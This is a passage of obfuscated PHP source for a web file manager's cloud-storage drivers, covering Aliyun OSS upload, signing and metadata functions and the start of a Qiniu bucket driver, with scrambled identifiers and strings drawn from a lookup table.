try { $´‹ç¶şã = $this->client->getObjectAcl($this->bucket, $this->pathEncode($´‘Ÿ±)); } catch (OSS\Core\OssException $»ÍÌÂ·ö) { return !1; } $ø¦–ç = $´‹ç¶şã == $ÆüéĞàø[47] ? $this->bucketAcl : $´‹ç¶şã; if ($ø¦–ç == $ÆüéĞàø[1434]) { return $ÆüéĞàø[1433]; } if ($ø¦–ç == $ÆüéĞàø[1435]) { return $ÆüéĞàø[596]; } return $ø¦–ç; } private function chmodPath($©ø® ˜ä, $ü¡Õé‡È = '') { $…åêÅã =& $_SERVER[ú÷îèÆÜ]; $Ú¯˜³”• = empty($ü¡Õé‡È) ? $…åêÅã[1435] : $ü¡Õé‡È; $¯úø¶»• = array($…åêÅã[47], $…åêÅã[223], $…åêÅã[1434], $…åêÅã[1435]); if (!in_array($Ú¯˜³”•, $¯úø¶»•)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($©ø® ˜ä), $Ú¯˜³”•); } catch (OSS\Core\OssException $’ä’áôï) { return !1; } return !0; } public function getContent($œœš•) { return $this->fileSubstr($œœš•, -1); } public function setContent($¦ï™Ç–², $¡åÒ¶ı = '') { $ùõÒåó =& $_SERVER[ú÷îèÆÜ]; try { $³…úÅòµ = $this->trafficLimit($ùõÒåó[1436]); $üË¶óúı = $this->client->putObject($this->bucket, $this->pathEncode($¦ï™Ç–²), $¡åÒ¶ı, $³…úÅòµ); } catch (OSS\Core\OssException $×ƒ½¾š) { return !1; } $ó„›­ş§ = array($ùõÒåó[1426] => trim($üË¶óúı[$ùõÒåó[1423]], $ùõÒåó[128]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($¦ï™Ç–²))); $this->updateObjMeta($¦ï™Ç–², $ó„›­ş§); return isset($üË¶óúı[$ùõÒåó[1437]][$ùõÒåó[284]]) ? !0 : !1; } private function updateObjMeta($œÌŞƒĞ, $åõúõ¾ü) { $œÌŞƒĞ = $this->pathEncode($œÌŞƒĞ); try { $–¿±ò¬ = array(OSS\OssClient::OSS_HEADERS => $åõúõ¾ü); $this->client->copyObject($this->bucket, $œÌŞƒĞ, $this->bucket, $œÌŞƒĞ, $–¿±ò¬); } catch (OSS\Core\OssException $°ßìå£) { return !1; } return !0; } public function upload($ÔêÔ˜ğş, $şê¨¯•Ö, $ÈÙÙÜ— = false, $•šáÌ¨ = REPEAT_REPLACE) { $à§ãÊ¢ =& $_SERVER[ú÷îèÆÜ]; $íí½øŒÆ = trim($ÔêÔ˜ğş, $à§ãÊ¢[18]); $Œ†­»Â = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($à§ãÊ¢[1426] => @md5_file($şê¨¯•Ö)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($ÔêÔ˜ğş))); $Œ†­»Â = $this->trafficLimit($à§ãÊ¢[1436], $Œ†­»Â); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($íí½øŒÆ), $şê¨¯•Ö, $Œ†­»Â); } catch (OSS\Core\OssException $ÍÙ®Ïº›) { return !1; } return $this->getPathOuter($ÔêÔ˜ğş); } public function getHost() { $ƒòÕæÇƒ =& $_SERVER[ú÷îèÆÜ]; $éÖÖææÙ = explode($ƒòÕæÇƒ[208], parent::getHost()); return $éÖÖææÙ[0] . $ƒòÕæÇƒ[208] . $this->bucket . $ƒòÕæÇƒ[20] . $éÖÖææÙ[1]; } public function uploadFormData($ĞºÊÈ÷, $ºÀ÷ùœÃ = 3600) { $Ïùƒ÷å³ =& $_SERVER[ú÷îèÆÜ]; if (!($¾åßö× = $this->getHost())) { return !1; } $ñÊÏâ™ = $ºÀ÷ùœÃ; $­›åÁº£ = date($Ïùƒ÷å³[1438], time() + $ñÊÏâ™); $½¯ÙâÎ = new DateTime($­›åÁº£); $Üá‘á” = $½¯ÙâÎ->format(DateTime::ISO8601); $à Ú¼áÕ = strpos($Üá‘á”, $Ïùƒ÷å³[349]); $Üá‘á” = substr($Üá‘á”, 0, $à Ú¼áÕ) . $Ïùƒ÷å³[1439]; $’Åã“°‰ = 1048576000 * 5; $Ø»ø’æÅ = $this->pathFather($ĞºÊÈ÷); $ÆÉÄŒì™ = array($Ïùƒ÷å³[267] => $Üá‘á”, $Ïùƒ÷å³[270] => array(array($Ïùƒ÷å³[1440], 0, $’Åã“°‰), array($Ïùƒ÷å³[273], $Ïùƒ÷å³[274], $Ø»ø’æÅ))); $±ŸšÔì = base64_encode(json_encode($ÆÉÄŒì™)); $–¶¬ŒÖ£ = base64_encode(hash_hmac($Ïùƒ÷å³[256], $±ŸšÔì, $this->secret, !0)); $«È¬àİ = array($Ïùƒ÷å³[285] => $±ŸšÔì, $Ïùƒ÷å³[1441] => $this->accessKey, $Ïùƒ÷å³[277] => $Ïùƒ÷å³[266], $Ïùƒ÷å³[1442] => $–¶¬ŒÖ£, $Ïùƒ÷å³[206] => $¾åßö×); $«È¬àİ = $this->trafficLimit($Ïùƒ÷å³[1436], $«È¬àİ); return $«È¬àİ; } public function multiUploadFormData($Ô“ÆáÕı, $şÜèİŸ = 3600) { $˜È£É—è =& $_SERVER[ú÷îèÆÜ]; if (!($ÊÉ¾ºÄö = $this->getHost())) { return !1; } $Á—Á¹¸ = $this->trafficLimit($˜È£É—è[1436]); $ê”®ÍÍØ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($Ô“ÆáÕı), $Á—Á¹¸); return array($˜È£É—è[248] => $ê”®ÍÍØ, $˜È£É—è[206] => $ÊÉ¾ºÄö . $˜È£É—è[18] . $this->pathEncode($Ô“ÆáÕı), $˜È£É—è[249] => gmdate($˜È£É—è[1443]), $˜È£É—è[104] => $Ô“ÆáÕı); } public function multiUploadAuthData($Ü ™ºÛ, $õ„’Ïœ² = array()) { $ìŞì¾Ôó =& $_SERVER[ú÷îèÆÜ]; $ì¢Ó¹éú = isset($õ„’Ïœ²[$ìŞì¾Ôó[249]]) ? $õ„’Ïœ²[$ìŞì¾Ôó[249]] : gmdate($ìŞì¾Ôó[1443]); $Ô˜îèó = isset($õ„’Ïœ²[$ìŞì¾Ôó[185]]) ? $õ„’Ïœ²[$ìŞì¾Ôó[185]] : $ìŞì¾Ôó[22]; $ú¤ Õ¢Ñ = $Ü ™ºÛ; if (isset($õ„’Ïœ²[$ìŞì¾Ôó[104]])) { $ú¤ Õ¢Ñ = $õ„’Ïœ²[$ìŞì¾Ôó[104]]; unset($õ„’Ïœ²[$ìŞì¾Ôó[104]]); } if (isset($õ„’Ïœ²[$ìŞì¾Ôó[250]])) { $õ„’Ïœ²[$ìŞì¾Ôó[249]] = $ì¢Ó¹éú; return $this->listUploadParts($ú¤ Õ¢Ñ, $õ„’Ïœ²); } $Ïší·Œ = array($ìŞì¾Ôó[251], $ìŞì¾Ôó[22], $ìŞì¾Ôó[130], $ì¢Ó¹éú, "\x78\x2d\157\x73\163\x2d\144\141\x74\x65\x3a{$ì¢Ó¹éú}", $ìŞì¾Ôó[18] . $this->bucket . $ìŞì¾Ôó[18] . $ú¤ Õ¢Ñ . $Ô˜îèó); if (strpos($Ô˜îèó, $ìŞì¾Ôó[252]) === 0) { $Ïší·Œ[0] = $ìŞì¾Ôó[253]; if ($¼Ã¨ = $this->trafficLimit($ìŞì¾Ôó[1436])) { $ú¤ Õ¢Ñ = $ìŞì¾Ôó[1444]; array_splice($Ïší·Œ, 5, 0, $ú¤ Õ¢Ñ . $ìŞì¾Ôó[4] . $¼Ã¨[$ú¤ Õ¢Ñ]); } } if (isset($õ„’Ïœ²[$ìŞì¾Ôó[254]]) && $õ„’Ïœ²[$ìŞì¾Ôó[254]] == $ìŞì¾Ôó[255]) { $Ïší·Œ[0] = $ìŞì¾Ôó[255]; } if (!empty($õ„’Ïœ²[$ìŞì¾Ôó[1445]])) { $Í«ìò„ = array_merge(array($Ïší·Œ[4]), $õ„’Ïœ²[$ìŞì¾Ôó[1445]]); sort($Í«ìò„); $Ïší·Œ[4] = implode($ìŞì¾Ôó[11], $Í«ìò„); } $“ô»ÅÖ” = implode($ìŞì¾Ôó[11], $Ïší·Œ); $æ§óÃ§— = base64_encode(hash_hmac($ìŞì¾Ôó[256], $“ô»ÅÖ”, $this->secret, !0)); $Ìš¶©€ = $ìŞì¾Ôó[1409] . $this->accessKey . $ìŞì¾Ôó[4] . $æ§óÃ§—; if (strpos($Ô˜îèó, $ìŞì¾Ôó[252]) === 0) { $Ìš¶©€ = array($ìŞì¾Ôó[258] => $Ìš¶©€, $ìŞì¾Ôó[249] => $ì¢Ó¹éú); if ($¼Ã¨) { $Ìš¶©€ = array_merge($Ìš¶©€, $¼Ã¨); } } return $Ìš¶©€; } public function listUploadParts($ÛÇßı©, $Ù¦£“˜‘) { $ü³ì¿³À =& $_SERVER[ú÷îèÆÜ]; $§°†šû€ = parse_url_query($Ù¦£“˜‘[$ü³ì¿³À[185]]); $ÛùÔàü = $this->client->listParts($this->bucket, $this->pathEncode($ÛÇßı©), $§°†šû€[$ü³ì¿³À[248]]); $ëˆ›ğÒ‰ = $ÛùÔàü->getListPart(); $°©—‰¶ = array(); foreach ($ëˆ›ğÒ‰ as $¢¡ª¤÷Ü) { $°©—‰¶[] = array($ü³ì¿³À[1430] => $¢¡ª¤÷Ü->getPartNumber(), $ü³ì¿³À[1431] => trim($¢¡ª¤÷Ü->getETag(), $ü³ì¿³À[128])); } unset($Ù¦£“˜‘[$ü³ì¿³À[250]], $Ù¦£“˜‘[$ü³ì¿³À[254]]); $Ï¹Ñè³ = $this->multiUploadAuthData($ÛÇßı©, $Ù¦£“˜‘); if (empty($Ï¹Ñè³)) { return !1; } return array($ü³ì¿³À[258] => $Ï¹Ñè³, $ü³ì¿³À[249] => $Ù¦£“˜‘[$ü³ì¿³À[249]], $ü³ì¿³À[260] => $°©—‰¶); } public function download($†°õØ—, $Õ¡‹Ù‡ó) { if ($this->isFolder($†°õØ—)) { return !1; } try { $¯ÎäüÆ = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $Õ¡‹Ù‡ó); $¯ÎäüÆ = $this->trafficLimit($_SERVER[ú÷îèÆÜ][119], $¯ÎäüÆ); $this->client->getObject($this->bucket, $this->pathEncode($†°õØ—), $¯ÎäüÆ); } catch (OSS\Core\OssException $Ó¦ÓàñÁ) { return !1; } return $Õ¡‹Ù‡ó; } public function fileSubstr($îÈ·Ü®ğ, $ÈŒ™­„ = 0, $ï£çÅ“ª = false) { if ($ÈŒ™­„ === -1) { $¥Íå¤» = array(); } else { if ($ï£çÅ“ª === !1) { $Ëí‹¤® = $this->size($îÈ·Ü®ğ); } else { $Ëí‹¤® = $ÈŒ™­„ + $ï£çÅ“ª - 1; } $¥Íå¤» = array(OSS\OssClient::OSS_RANGE => "{$ÈŒ™­„}\55{$Ëí‹¤®}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($îÈ·Ü®ğ), $¥Íå¤»); } catch (OSS\Core\OssException $¼ë²îØÑ) { think_exception($¼ë²îØÑ->getMessage()); return !1; } } private function trafficLimit($§ÏÕşƒÊ, $‡ÂÓÑÃ– = array()) { $úôÉ‘„¡ =& $_SERVER[ú÷îèÆÜ]; if ($§ÏÕşƒÊ == $úôÉ‘„¡[1436] && $this->isUploadServer() || $§ÏÕşƒÊ == $úôÉ‘„¡[119] && $this->isFileOutServer()) { return $‡ÂÓÑÃ–; } $àë–ü = floatval($GLOBALS[$úôÉ‘„¡[16]][$úôÉ‘„¡[99]][$úôÉ‘„¡[117]][$§ÏÕşƒÊ]) * 1024 * 1024 * 8; if (!$àë–ü) { return $‡ÂÓÑÃ–; } $àë–ü = $àë–ü < 819200 ? 819200 : ($àë–ü > 838860800 ? 838860800 : $àë–ü); $‡ÂÓÑÃ–[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($àë–ü); return $‡ÂÓÑÃ–; } public function link($ÊÑ¿´ß¼, $ÏÉİ«ü = array()) { $•ı›³–ç =& $_SERVER[ú÷îèÆÜ]; if (!$this->exist($ÊÑ¿´ß¼) || $this->isFolder($ÊÑ¿´ß¼)) { return !1; } try { $ÏÉİ«ü = $this->trafficLimit($•ı›³–ç[119], $ÏÉİ«ü); $Õß‚§é = $this->client->signUrl($this->bucket, $this->pathEncode($ÊÑ¿´ß¼), 3600 * 12, $•ı›³–ç[255], $ÏÉİ«ü); return $this->getCdnLink($Õß‚§é); } catch (OSS\Core\OssException $îÀÎá¾¾) { return !1; } } public function fileOut($Õ„Ç×…ì, $äÉ´õÂ³ = false, $“ŸıÀß = false, $ËÚ«¨ÒÛ = '') { $©ÒñîØ =& $_SERVER[ú÷îèÆÜ]; if ($this->isFileOutServer()) { return $this->fileOutServer($Õ„Ç×…ì, $äÉ´õÂ³, $“ŸıÀß, $ËÚ«¨ÒÛ); } if (!$“ŸıÀß) { $“ŸıÀß = $this->pathThis($Õ„Ç×…ì); } $“ŸıÀß = rawurlencode($“ŸıÀß); $ï¸´œÈ‘ = get_file_mime(get_path_ext($“ŸıÀß)); if ($ï¸´œÈ‘ == $©ÒñîØ[242]) { return parent::fileOut($Õ„Ç×…ì, $äÉ´õÂ³, $“ŸıÀß, $ËÚ«¨ÒÛ); } $äÉ´õÂ³ = $äÉ´õÂ³ ? $©ÒñîØ[1446] : $©ÒñîØ[1447]; $ÄŠÁ£ı¥ = array(OSS\OssClient::OSS_SUB_RESOURCE => $©ÒñîØ[1448] . rawurlencode("{$äÉ´õÂ³}\x3b\x66\x69\154\x65\156\141\155\x65\x3d{$“ŸıÀß}")); $ÄŠÁ£ı¥[OSS\OssClient::OSS_SUB_RESOURCE] .= $©ÒñîØ[1449] . rawurlencode($ï¸´œÈ‘); $Ø°ú²œŒ = $this->link($Õ„Ç×…ì, $ÄŠÁ£ı¥); $this->fileOutLink($Ø°ú²œŒ); } public function fileOutServer($¬¼ïñÄø, $Ã÷ä…¹ä = false, $„ş•Âƒ = false, $†åïá¬€ = '') { parent::fileOut($¬¼ïñÄø, $Ã÷ä…¹ä, $„ş•Âƒ, $†åïá¬€); } public function fileOutImage($ÅÌÏ›«³, $ÆŠØê„× = 250) { if ($this->size($ÅÌÏ›«³) > 1024 * 1024 * 20) { return $this->fileOutImageServer($ÅÌÏ›«³, $ÆŠØê„×); } $Ş™ñŸ‹‰ = array(OSS\OssClient::OSS_PROCESS => $_SERVER[ú÷îèÆÜ][1450] . $ÆŠØê„×); $§ÌÈÇµ = $this->link($ÅÌÏ›«³, $Ş™ñŸ‹‰); $this->fileOutLink($§ÌÈÇµ); } public function fileOutImageServer($Šá»¿Æ¯, $³°±›¯ó = 250) { parent::fileOutImage($Šá»¿Æ¯, $³°±›¯ó); } public function fileOutLink($Øúˆ™÷•) { $ê¿‰™ç =& $_SERVER[ú÷îèÆÜ]; if (!$this->isCdnHost() && substr($Øúˆ™÷•, 0, 7) == $ê¿‰™ç[1371]) { $Øúˆ™÷• = $ê¿‰™ç[1372] . substr($Øúˆ™÷•, 7); } header($ê¿‰™ç[172] . $Øúˆ™÷•); die; } public function hashMd5($ıË¶¦­˜, $ç€¨Û÷” = '') { $å¢Ì§„æ =& $_SERVER[ú÷îèÆÜ]; $˜¡óƒœë = $this->_objectMeta($ıË¶¦­˜); if (!$˜¡óƒœë) { return $å¢Ì§„æ[22]; } if (!isset($˜¡óƒœë[$å¢Ì§„æ[1426]]) && !empty($ç€¨Û÷”)) { $ˆ¨ÛÄ™ = $this->updateObjMeta($ıË¶¦­˜, array($å¢Ì§„æ[1426] => $ç€¨Û÷”)); $˜¡óƒœë[$å¢Ì§„æ[1426]] = $ˆ¨ÛÄ™ ? $ç€¨Û÷” : $å¢Ì§„æ[22]; } return isset($˜¡óƒœë[$å¢Ì§„æ[1426]]) ? strtolower($˜¡óƒœë[$å¢Ì§„æ[1426]]) : $å¢Ì§„æ[22]; } public function size($ıÈÚ€¢’) { $™êë…íÀ = $this->objectMeta($ıÈÚ€¢’); return $™êë…íÀ ? $™êë…íÀ[$_SERVER[ú÷îèÆÜ][86]] : 0; } public function info($ãçöÒŠ†) { if ($this->isFolder($ãçöÒŠ†)) { return $this->folderInfo($ãçöÒŠ†); } else { if ($this->isFile($ãçöÒŠ†)) { return $this->fileInfo($ãçöÒŠ†); } } return !1; } public function exist($™ÎŒ™’ˆ) { return $this->isFile($™ÎŒ™’ˆ) || $this->isFolder($™ÎŒ™’ˆ); } public function isFile($”¦áÓ‰) { return !$this->isFolder($”¦áÓ‰) && $this->objectMeta($”¦áÓ‰); } public function isFolder($óÃ“ÄÎ·) { return $this->cacheMethod($_SERVER[ú÷îèÆÜ][176], $óÃ“ÄÎ·); } protected function objectMeta($Ò€¬Úø) { return $this->cacheMethod($_SERVER[ú÷îèÆÜ][178], $Ò€¬Úø); } protected function _objectMeta($õˆáæë) { $É¼ëÎÌÔ =& $_SERVER[ú÷îèÆÜ]; try { $…š“ÀÍ = $this->client->getObjectMeta($this->bucket, $this->pathEncode($õˆáæë)); } catch (OSS\Core\OssException $ÎÍ§€Ğ¾) { $…š“ÀÍ = !1; } if ($…š“ÀÍ) { $…š“ÀÍ[$É¼ëÎÌÔ[86]] = intval($…š“ÀÍ[$É¼ëÎÌÔ[1424]]); } return $…š“ÀÍ; } protected function _isFolder($’¨”®ä«) { $²™ø›¸ =& $_SERVER[ú÷îèÆÜ]; if ($’¨”®ä« == $²™ø›¸[22] || $’¨”®ä« == $²™ø›¸[18]) { return !0; } $ÅÁñ£º = array($²™ø›¸[1419] => $²™ø›¸[18], $²™ø›¸[1420] => rtrim($’¨”®ä«, $²™ø›¸[18]) . $²™ø›¸[18], $²™ø›¸[1421] => 1, $²™ø›¸[1422] => $²™ø›¸[22]); $¦¿•êï = $this->client->listObjects($this->bucket, $ÅÁñ£º); if ($¦¿•êï->getObjectList() || $¦¿•êï->getPrefixList()) { return !0; } return !1; } } class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $bucketManager = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\x30"; public $config = array(); public function __construct($Ëğñ¼Ä) { parent::__construct(); require_once SDK_DIR . $_SERVER[ú÷îèÆÜ][1451]; $this->_init($Ëğñ¼Ä); } public function _init($Ãƒ›ı“) { $¹ÔÚã³€ =& $_SERVER[ú÷îèÆÜ]; $this->config = $Ãƒ›ı“; foreach ($Ãƒ›ı“ as $Ş®›¹êµ => $ºß‘Ô¥å) { if (isset($this->{$Ş®›¹êµ})) { $this->{$Ş®›¹êµ} = $ºß‘Ô¥å; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($¹ÔÚã³€[1452] . LNG($¹ÔÚã³€[1410])); } $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->configView = new \Qiniu\Config(); $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->configView); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($º°¨¬Ø„, $ºíÑ«’æ = '', $­—¥ÚÊÓ = REPEAT_RENAME) { if ($this->setContent($º°¨¬Ø„, $ºíÑ«’æ)) { return $this->getPathOuter($º°¨¬Ø„); } return !1; } public function mkdir($é‚Ÿİ®Û, $Ô½Šñş’ = REPEAT_SKIP) { $ËãŒ÷• =& $_SERVER[ú÷îèÆÜ]; $‹ââë ¬ = trim($é‚Ÿİ®Û, $ËãŒ÷•[18]); if ($this->_isFolder($‹ââë ¬)) { return $this->getPathOuter($‹ââë ¬); } $é‚Ÿİ®Û = $‹ââë ¬ . $ËãŒ÷•[18]; $÷Ÿ¼–Õ = get_path_this($‹ââë ¬); $Ç«ä¨²ô = $é‚Ÿİ®Û . $÷Ÿ¼–Õ; if (!$this->mkfile($Ç«ä¨²ô)) { return !1; } if (!$this->moveFile($Ç«ä¨²ô, $é‚Ÿİ®Û)) { $this->delFile($Ç«ä¨²ô); return !1; } return $this->getPathOuter($‹ââë ¬); } public function copyFile($‹°¶´…ö, $üê’µ…ã) { $®¡¥Ñ“Ğ = $this->bucketManager->copy($this->bucket, $‹°¶´…ö, $this->bucket, $üê’µ…ã, !0); return $®¡¥Ñ“Ğ ? !1 : $this->getPathOuter($üê’µ…ã); } public function moveFile($ŞÁÖĞ¾ù, $›ø¿Ã¤ê) { $Ô‹÷ş = $this->bucketManager->move($this->bucket, $ŞÁÖĞ¾ù, $this->bucket, $›ø¿Ã¤ê, !0); return $Ô‹÷ş ? !1 : $this->getPathOuter($›ø¿Ã¤ê); } public function delFile($ïï›ˆ„¥) { if (!$this->exist($ïï›ˆ„¥)) { return !0; } $îˆÔ• = $this->bucketManager->delete($this->bucket, $ïï›ˆ„¥); return $îˆÔ• ? !1 : !0; } public function delFolder($ëË®Ã²°) { $Œ¢Š—‰ =& $_SERVER[ú÷îèÆÜ]; if (!$this->exist($ëË®Ã²°)) { return !0; } $this->listItemCache = !1; $•²­›êÜ = $this->fileList($ëË®Ã²°); $this->listItemCache = !0; $íå±“¿ = trim($ëË®Ã²°, $Œ¢Š—‰[18]) . $Œ¢Š—‰[18]; if (!empty($ëË®Ã²°) && $ëË®Ã²° !== $Œ¢Š—‰[222] && !in_array($íå±“¿, $•²­›êÜ[$Œ¢Š—‰[92]])) { $•²­›êÜ[$Œ¢Š—‰[92]][] = $íå±“¿; } $—–·İ¦Ö = $this->delByBatch($•²­›êÜ[$Œ¢Š—‰[93]]); if (!$—–·İ¦Ö) { return !1; } $—–·İ¦Ö = $this->delByBatch($•²­›êÜ[$Œ¢Š—‰[92]]); if (!$—–·İ¦Ö) { return !1; } return $this->delFile($íå±“¿); } private function delByBatch($•ıîÖ…ö) { foreach (array_chunk($•ıîÖ…ö, 1000) as $ ºƒÍÉ†) { $Ò´ù­Îö = $this->bucketManager->buildBatchDelete($this->bucket, $ ºƒÍÉ†); list($»’ú»Îğ, $ÉÉïğ—­) = $this->bucketManager->batch($Ò´ù­Îö); if ($ÉÉïğ—­) { return !1; } } return !0; } public function rename($‚Ó×¶Ã¼, $Šö’›£õ) { return $this->renameObject($‚Ó×¶Ã¼, $Šö’›£õ); } public function fileInfo($ÑÌáˆ»‰, $Œ§Î‘òá = false, $şœô€÷ = array()) { $æãêöòŞ =& $_SERVER[ú÷îèÆÜ]; $¢Çİß¢Ñ = array($æãêöòŞ[42] => $this->pathThis($ÑÌáˆ»‰), $æãêöòŞ[94] => $this->getPathOuter($æãêöòŞ[18] . $ÑÌáˆ»‰), $æãêöòŞ[43] => $æãêöòŞ[224], $æãêöòŞ[86] => isset($şœô€÷[$æãêöòŞ[1453]]) ? $şœô€÷[$æãêöòŞ[1453]] : 0, $æãêöòŞ[185] => $this->ext($ÑÌáˆ»‰)); if ($Œ§Î‘òá) { return $¢Çİß¢Ñ; } $¢Çİß¢Ñ[$æãêöòŞ[225]] = $¢Çİß¢Ñ[$æãêöòŞ[95]] = 0; $¢Çİß¢Ñ[$æãêöòŞ[226]] = $¢Çİß¢Ñ[$æãêöòŞ[227]] = !0; if (empty($şœô€÷)) { $şœô€÷ = $this->objectMeta($ÑÌáˆ»‰); if (!$şœô€÷) { return $¢Çİß¢Ñ; } } if (isset($şœô€÷[$æãêöòŞ[228]]) && $şœô€÷[$æãêöòŞ[228]]) { $¢Çİß¢Ñ[$æãêöòŞ[229]] = $şœô€÷[$æãêöòŞ[228]]; } if (isset($şœô€÷[$æãêöòŞ[238]]) && $şœô€÷[$æãêöòŞ[238]]) { $¢Çİß¢Ñ[$æãêöòŞ[229]] = $şœô€÷[$æãêöòŞ[238]]; } if (isset($şœô€÷[$æãêöòŞ[1454]])) { $¢Çİß¢Ñ[$æãêöòŞ[95]] = substr($şœô€÷[$æãêöòŞ[1454]] . $æãêöòŞ[22], 0, 10); } if (isset($şœô€÷[$æãêöòŞ[1453]])) { $¢Çİß¢Ñ[$æãêöòŞ[86]] = $şœô€÷[$æãêöòŞ[1453]]; } return $¢Çİß¢Ñ; } public function folderInfo($ãÏˆ¡š™, $Ü½è¨ = false) { $ˆìÛ™ƒ‹ =& $_SERVER[ú÷îèÆÜ]; $ØôêâñÀ = array($ˆìÛ™ƒ‹[42] => $this->pathThis($ãÏˆ¡š™), $ˆìÛ™ƒ‹[94] => $this->getPathOuter($ˆìÛ™ƒ‹[18] . $ãÏˆ¡š™), $ˆìÛ™ƒ‹[43] => $ˆìÛ™ƒ‹[85]); if ($Ü½è¨) { return $ØôêâñÀ; } $ØôêâñÀ[$ˆìÛ™ƒ‹[225]] = $ØôêâñÀ[$ˆìÛ™ƒ‹[95]] = 0; $ØôêâñÀ[$ˆìÛ™ƒ‹[226]] = $ØôêâñÀ[$ˆìÛ™ƒ‹[227]] = !0; $ãÏˆ¡š™ = rtrim($ãÏˆ¡š™, $ˆìÛ™ƒ‹[18]) . $ˆìÛ™ƒ‹[18]; $Ü—ñ¸¥Ã = $this->objectMeta($ãÏˆ¡š™); if (isset($Ü—ñ¸¥Ã[$ˆìÛ™ƒ‹[1454]])) { $ØôêâñÀ[$ˆìÛ™ƒ‹[95]] = substr($Ü—ñ¸¥Ã[$ˆìÛ™ƒ‹[1454]] . $ˆìÛ™ƒ‹[22], 0, 10); } return $ØôêâñÀ; } public function listPath($Ê‘ì²•, $Á“âËÑº = false) { $ñ…¶Ø´” =& $_SERVER[ú÷îèÆÜ]; $Æ“š»¼Ê = $this->fileList($Ê‘ì²•, $ñ…¶Ø´”[18], !0); foreach ($Æ“š»¼Ê[$ñ…¶Ø´”[92]] as $±Ä†·¬ => $±Ü¨ª«½) { $Æ“š»¼Ê[$ñ…¶Ø´”[92]][$±Ä†·¬] = $this->folderInfo($±Ü¨ª«½, $Á“âËÑº); } foreach ($Æ“š»¼Ê[$ñ…¶Ø´”[93]] as $±Ä†·¬ => $±Ü¨ª«½) { $Æ“š»¼Ê[$ñ…¶Ø´”[93]][$±Ä†·¬] = $this->fileInfo($±Ü¨ª«½[$ñ…¶Ø´”[104]], $Á“âËÑº, $±Ü¨ª«½); } return $Æ“š»¼Ê; } public function has($ã­¨è¼, $‡ø€Ûı§ = false, $ğù»ûú = true) { $Ò–äúú =& $_SERVER[ú÷îèÆÜ]; $ã­¨è¼ = trim($ã­¨è¼, $Ò–äúú[18]); $ˆ¬ÇÁƒô = empty($ã­¨è¼) && $ã­¨è¼ !== $Ò–äúú[222] ? $Ò–äúú[22] : $ã­¨è¼ . $Ò–äúú[18]; $Ö²Æ÷€¨ = $Ò–äúú[22]; $˜”åâñ” = 500; $ÌƒĞÍùñ = $Ò–äúú[18]; $àŞü”Ö = $«…§º· = 0; while (!0) { check_abort(); list($Ü÷ï²­, $¼å«¯è°) = $this->bucketManager->listFiles($this->bucket, $ˆ¬ÇÁƒô, $Ö²Æ÷€¨, $˜”åâñ”, $ÌƒĞÍùñ); if ($¼å«¯è°) { break; } $Ö²Æ÷€¨ = array_key_exists($Ò–äúú[1422], $Ü÷ï²­) ? $Ö²Æ÷€¨ = $Ü÷ï²­[$Ò–äúú[1455]] : $Ò–äúú[22]; if ($‡ø€Ûı§) { if (!empty($Ü÷ï²­[$Ò–äúú[1456]])) { $àŞü”Ö += count($Ü÷ï²­[$Ò–äúú[1456]]); } if (!empty($Ü÷ï²­[$Ò–äúú[1457]])) { $«…§º· += count($Ü÷ï²­[$Ò–äúú[1457]]); } if ($Ö²Æ÷€¨ === $Ò–äúú[22]) { break; } continue; } if ($ğù»ûú) { if (!empty($Ü÷ï²­[$Ò–äúú[1456]])) { return !0; } } else { if (!empty($Ü÷ï²­[$Ò–äúú[1457]])) { return !0; } } if ($Ö²Æ÷€¨ === $Ò–äúú[22]) { break; } } if ($‡ø€Ûı§) { return array($Ò–äúú[233] => $àŞü”Ö, $Ò–äúú[234] => $«…§º·); } return !1; } public function listAll($ÍêÅğØ) { $¸öÇŠ»’ =& $_SERVER[ú÷îèÆÜ]; $Ì¦ˆ±¨ = $this->fileList($ÍêÅğØ, $¸öÇŠ»’[22], !0); $ÆÇÓŠªÈ = array_to_keyvalue($Ì¦ˆ±¨[$¸öÇŠ»’[93]], $¸öÇŠ»’[42]); foreach ($Ì¦ˆ±¨[$¸öÇŠ»’[92]] as $×ÅÍ…½¼) { if (is_string($×ÅÍ…½¼)) { $ÆÇÓŠªÈ[$×ÅÍ…½¼] = array($¸öÇŠ»’[86] => 0); } } return $this->listAllFiles($ÍêÅğØ, $ÆÇÓŠªÈ); } private function fileList($ Å† Áñ, $İÎ±ÛŞî = '', $™‰Áñ = 0) { $ûüÕçäí =& $_SERVER[ú÷îèÆÜ]; $ Å† Áñ = trim($ Å† Áñ, $ûüÕçäí[18]); $¸Œ£“Şæ = empty($ Å† Áñ) && $ Å† Áñ !== $ûüÕçäí[222] ? $ûüÕçäí[22] : $ Å† Áñ . $ûüÕçäí[18]; $óïó˜”€ = $ûüÕçäí[22]; $ïãœ¢±­ = 1000; $®“Üé… = $½ğ‚ö“ƒ = array(); while (!0) { check_abort(); list($«é‹“‚, $«Ëòí¿) = $this->bucketManager->listFiles($this->bucket, $¸Œ£“Şæ, $óïó˜”€, $ïãœ¢±­, $İÎ±ÛŞî); if ($«Ëòí¿) { break; } $óïó˜”€ = array_key_exists($ûüÕçäí[1422], $«é‹“‚) ? $óïó˜”€ = $«é‹“‚[$ûüÕçäí[1455]] : $ûüÕçäí[22]; $ÚÎ°ß¸í = isset($«é‹“‚[$ûüÕçäí[1456]]) ? $«é‹“‚[$ûüÕçäí[1456]] : array(); $¤Ø‹¥íê = isset($«é‹“‚[$ûüÕçäí[1457]]) ? $«é‹“‚[$ûüÕçäí[1457]] : array(); foreach 